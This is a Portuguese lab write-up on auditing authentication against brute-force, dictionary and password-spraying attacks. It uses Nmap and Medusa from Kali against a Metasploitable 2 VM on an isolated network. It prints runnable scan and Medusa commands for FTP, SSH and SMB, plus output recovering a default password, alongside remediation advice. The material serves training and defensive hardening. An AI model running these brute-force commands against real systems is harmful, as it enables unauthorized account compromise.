# Auditoria de Segurança: Simulação de Ataques de Força Bruta e Hardening de Serviços

> **Uso estritamente ético e profissional**  
> Este repositório destina-se a treinamento em laboratório isolado e auditorias autorizadas. Qualquer teste fora de escopo formal viola princípios de segurança, conformidade e legislação aplicável.

## 1. Introdução

Ataques contra autenticação seguem padrões táticos distintos, e compreender essas diferenças é essencial para avaliar risco real em infraestrutura.

### 1.1 Brute Force (Força Bruta)
- Estratégia exaustiva: tenta combinações de senha até obter sucesso.
- Alto custo operacional e maior probabilidade de detecção por volume.
- Eficaz principalmente quando não há lockout, rate limiting e monitoramento.

### 1.2 Dictionary Attack (Ataque de Dicionário)
- Usa listas de senhas prováveis (fracas, comuns, padrões de ambiente).
- Mais eficiente que brute force puro, reduzindo tempo de tentativa.
- Costuma explorar cultura organizacional (ex.: `Empresa@2026`, `backup123`).

### 1.3 Password Spraying
- Tática de baixa cadência: uma senha comum aplicada a muitos usuários.
- Objetivo: evitar lockout por tentativas consecutivas em uma única conta.
- Muito relevante em AD/SSO e ambientes corporativos com contas numerosas.

## 2. Metodologia

## 2.1 Ambiente de laboratório (Host-Only)
- **Plataforma atacante:** Kali Linux
- **Ferramenta principal:** Medusa
- **Alvo vulnerável:** Metasploitable 2
- **Isolamento:** rede Host-Only (sem rota para internet/produção)

### Endereçamento fictício
- Kali Linux: `192.168.56.10`
- Metasploitable 2: `192.168.56.20`
- Host (adaptador virtual): `192.168.56.1`

### Premissas de auditoria
- Escopo autorizado e documentado.
- Janela de teste definida.
- Coleta de evidências com integridade preservada.

## 2.2 Service Discovery pré-ataque (Nmap)
Antes de qualquer tentativa de autenticação, executa-se descoberta de serviços para confirmar superfície exposta e priorizar vetores.

```bash
# Descoberta inicial de hosts na rede
nmap -sn 192.168.56.0/24

# Enumeração de portas e serviços no alvo
nmap -sS -sV -Pn -p 21,22,139,445 192.168.56.20

# Versão detalhada e scripts padrão (somente em lab autorizado)
nmap -sC -sV -Pn 192.168.56.20
```

**Racional técnico**
- `-sn`: identifica hosts ativos sem varredura de portas.
- `-sS`: SYN scan eficiente para descoberta de portas TCP.
- `-sV`: identifica versão dos serviços (suporte à priorização de risco).
- `-Pn`: ignora ICMP blocking e força avaliação direta do alvo.
- `-sC`: scripts NSE padrão para contexto adicional de exposição.

## 3. Cenários de Teste com Medusa

> Objetivo: validar robustez de credenciais e controles de defesa, não comprometer disponibilidade.

## 3.1 FTP
```bash
medusa -h 192.168.56.20 -u msfadmin -P custom_wordlist.txt -M ftp -t 4 -f -v 6
```

**Flags utilizadas**
- `-h`: host alvo.
- `-u`: usuário específico sob avaliação.
- `-P`: arquivo de wordlist de senhas.
- `-M ftp`: módulo de autenticação FTP.
- `-t 4`: até 4 threads (controle de carga).
- `-f`: encerra após primeiro sucesso no host.
- `-v 6`: verbosidade alta para rastreabilidade.

## 3.2 SSH
```bash
medusa -h 192.168.56.20 -u msfadmin -P custom_wordlist.txt -M ssh -t 4 -f -v 6
```

**Justificativa**
- Mesmo padrão de flags para garantir comparabilidade de evidências entre serviços.
- `ssh` é vetor crítico por permitir acesso remoto administrativo.

## 3.3 SMB
```bash
medusa -h 192.168.56.20 -u administrator -P custom_wordlist.txt -M smbnt -t 2 -f -v 6
```

**Justificativa**
- `-M smbnt`: módulo SMB/NTLM do Medusa.
- `-t 2`: menor paralelismo para reduzir ruído em serviço sensível e facilitar correlação em logs.

## 4. PoC (Proof of Concept)

```text
$ medusa -h 192.168.56.20 -u msfadmin -P custom_wordlist.txt -M ssh -t 4 -f -v 6
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks

[STATUS] Medusa started at 2026-05-11 14:22:09
[DATA]   Target: 192.168.56.20 (1 host)
[DATA]   User:   msfadmin
[DATA]   Pass:   custom_wordlist.txt (20 entries)
[DATA]   Module: ssh

ACCOUNT CHECK: [ssh] Host: 192.168.56.20 User: msfadmin Password: admin
ACCOUNT CHECK: [ssh] Host: 192.168.56.20 User: msfadmin Password: backup
ACCOUNT CHECK: [ssh] Host: 192.168.56.20 User: msfadmin Password: msfadmin
[SUCCESS] account found - Host: 192.168.56.20 User: msfadmin Password: msfadmin

[STATUS] Stopping scan due to -f (first valid credential found)
[STATUS] Medusa finished at 2026-05-11 14:22:14
```

## 5. Checklist de Auditoria (Evidências)

- [ ] Escopo formal aprovado (documento de autorização).
- [ ] Data/hora de início e fim do teste (timestamp com timezone).
- [ ] Hash SHA-256 da wordlist utilizada.
- [ ] Comando exato executado (incluindo flags).
- [ ] Output bruto do terminal preservado.
- [ ] Logs do alvo correlacionados (`/var/log/auth.log`, logs FTP/SMB).
- [ ] Evidência de sucesso/falha por serviço.
- [ ] Registro de impacto operacional (CPU, memória, disponibilidade).
- [ ] Registro de ações de contenção/hardening pós-teste.
- [ ] Conclusão com risco técnico e risco de negócio.

### Exemplo de geração de hash da wordlist
```bash
sha256sum custom_wordlist.txt
```

## 6. Remediação (Blue Team)

## 6.1 MFA (Autenticação Multifator)
- Exigir MFA para acessos privilegiados, VPN, jump hosts e painéis administrativos.
- Priorizar fatores resistentes a phishing (FIDO2/WebAuthn).
- Formalizar exceções com prazo e compensações de controle.

## 6.2 Fail2Ban e Rate Limiting
- Implementar jails para `sshd` (e outros serviços aplicáveis).
- Ajustar `maxretry`, `findtime`, `bantime` com base em baseline do ambiente.
- Integrar com firewall para bloqueio automático de origem ofensiva.

## 6.3 Políticas de Account Lockout
- Definir lockout por tentativas consecutivas inválidas.
- Aplicar backoff progressivo para reduzir brute force online.
- Balancear segurança e continuidade operacional (evitar DoS por lockout massivo).

## 6.4 Gestão de Credenciais
- Proibir senhas fracas e credenciais padrão.
- Exigir comprimento mínimo e complexidade contextual.
- Implementar rotação orientada a risco e histórico de senhas.

## 6.5 Monitoramento e SIEM
- Centralizar logs de autenticação (Linux, SMB, aplicações).
- Criar casos de uso para detectar:
  - muitas falhas em curto intervalo;
  - uma senha testada em vários usuários (spraying);
  - autenticação bem-sucedida após sequência de falhas.
- Definir playbook SOC com triagem, contenção e resposta.

## 6.6 Hardening de SSH
- Desabilitar `PermitRootLogin`.
- Restringir `PasswordAuthentication` quando possível (preferir chave pública).
- Limitar grupos autorizados (`AllowGroups`), origem e horários conforme política.

## 7. Conformidade e Ética Profissional

Este laboratório apoia práticas de auditoria alinhadas a governança e compliance (princípio de menor privilégio, rastreabilidade e segregação de ambientes). A finalidade é elevar maturidade defensiva, não exploração indevida.